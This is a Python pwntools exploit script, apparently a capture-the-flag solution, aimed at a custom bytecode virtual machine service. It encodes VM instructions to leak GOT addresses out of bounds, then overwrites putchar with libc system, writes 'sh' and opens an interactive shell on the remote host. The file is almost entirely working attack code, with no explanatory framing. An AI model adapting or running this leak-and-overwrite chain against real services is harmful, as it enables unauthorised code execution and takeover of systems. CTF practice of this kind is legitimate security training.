from __future__ import print_function
from pwn import *
import struct

local = False
ip = "172.18.0.2"
port = 3301

def bin2byte(b):
	return ''.join([chr(int(b[i:i+8],2)) for i in range(0,len(b),8)])

ex = lambda x: "1"*x+"0"

nop = lambda:ex(0)
inc_ptr = lambda :ex(1)
dec_ptr = lambda :ex(2)
inc = lambda:ex(3)
dec = lambda:ex(4)
jmp1 = lambda:ex(9)
jmp2 = lambda:ex(5)
pre_jmp = lambda:ex(6)
pr = lambda: ex(7)
where = lambda:ex(8)

def helper0(base,n):
	code = ""
	code+=inc_ptr()
	code+=where()


	code+=dec_ptr()
	code+=dec_ptr()

	for _ in range(base):
		code+=dec_ptr()

	for _ in range(n):
		code+=dec()

	for _ in range(base):
		code+=inc_ptr()

	code+=inc_ptr()
	code+=inc_ptr()

	code+=pre_jmp()
	
	code+=dec_ptr()

	code+=dec()
	code+=jmp1()
	code+=jmp2()
	return code

def helper1(base,n):
	code = ""

	code+=inc_ptr()
	code+=where()


	code+=dec_ptr()
	code+=dec_ptr()

	for _ in range(base):
		code+=dec_ptr()

	for _ in range(n):
		code+=inc()

	for _ in range(base):
		code+=inc_ptr()

	code+=inc_ptr()
	code+=inc_ptr()

	code+=pre_jmp()
	
	code+=dec_ptr()

	code+=dec()
	code+=jmp1()
	code+=jmp2()
	return code

def encode(code):
	q = code
	q=q+"1"*(8-(len(q)%8))
	n = struct.pack("I",len(q))
	q = n+bin2byte(q)
	regs=15
	q = struct.pack("I",regs)+q
	return q

def readAtOffset(off,l):
	log.info('building leak code..')

	code=pr()
	code+=inc()
	code+=inc_ptr()

	code+=where()
	code+=dec()
	code+=dec()
	code+=dec()

	for _ in range(off):
		code+=dec()
	code+=pre_jmp()
	code+=dec_ptr()
	code+=jmp1()

	for _ in range(l):
		code+=pr()
		code+=inc_ptr()
	if local:
		p = process("./vm",level='error')
	else:
		p = remote(ip,port)
	p.clean()
	p.send(encode(code))
	p.recv(1)
	r = p.recv(l)
	return r


leak = readAtOffset((0x405000-0x404018)/4,3)

putchar = ord(leak[0])
puts 	= ord(leak[2])

log.success('putchar: '+hex(putchar))
log.success('puts:    '+hex(puts))

log.info('Press enter to continue..')

def exploit():

	offset_putchar = 0x0000000000082810
	offset_system = 0x000000000004f440

	log.info('building exploit code..')

	#Now we have the libc_version
	#We can now overwrite putchar with a one_gadget
	code=pr()
	code+=inc()
	code+=inc_ptr()

	code+=where()
	code+=dec()
	code+=dec()
	code+=dec()

	for _ in range((0x405000-0x404018)/4):
		code+=dec()
	code+=pre_jmp()
	code+=dec_ptr()
	code+=jmp1()

	code+=inc()

	d = offset_putchar-offset_system
	offset = 24


	code+=inc_ptr()
	for _ in range(offset):
		code+=inc_ptr()
	for _ in range(488):
		code+=inc()
	
	code+=helper0(offset,d/488)
	for _ in range(offset):
		code+=dec_ptr()
	code+=dec_ptr()
	for _ in range(d%488):
		code+=dec()
	
	d = (ord('h')<<8)|ord('s')

	for _ in range(offset+8):
		code+=inc_ptr()


	code+=inc_ptr()
	for _ in range(2):
		code+=inc_ptr()
	for _ in range(164):
		code+=inc()


		
	code+=helper1(2,d/164)

	for _ in range(2):
		code+=dec_ptr()
	code+=dec_ptr()
	for _ in range(d%164):
		code+=inc()
	
	for _ in range(offset+14):
		code+=dec_ptr()

	a = 0x404098-0x0000000000403e10
	for _ in range(a):
		code+=inc()
	
	code+=pr()
	

	if local:
		p = process("./vm",level='error')
	else:
		p = remote(ip,port)
	p.clean()
	log.info('sending payload..')
	p.send(encode(code))
	log.info('Enjoy your shell and have a nice day!')	
	p.interactive()

exploit()
